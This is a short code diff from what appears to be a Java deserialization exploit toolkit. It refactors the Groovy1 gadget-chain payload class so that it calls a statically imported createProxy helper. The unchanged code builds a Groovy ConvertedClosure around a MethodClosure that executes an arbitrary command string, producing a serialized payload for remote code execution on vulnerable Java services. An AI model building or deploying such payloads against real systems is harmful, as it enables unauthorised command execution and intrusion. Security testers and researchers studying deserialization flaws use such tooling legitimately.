@@ -9,6 +9,8 @@ import org.codehaus.groovy.runtime.MethodClosure;
 import java.lang.reflect.InvocationHandler;
 import java.util.Map;
 
+import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
+
 /**
  * Gadget chain:
  * ObjectInputStream.readObject()
@@ -29,7 +31,7 @@ public class Groovy1 implements ObjectPayload<InvocationHandler> {
 
     public InvocationHandler getObject(String command) throws Exception {
         final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
-        final Map map = Gadgets.createProxy(closure, Map.class);
+        final Map map = createProxy(closure, Map.class);
         final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
         return handler;
     }
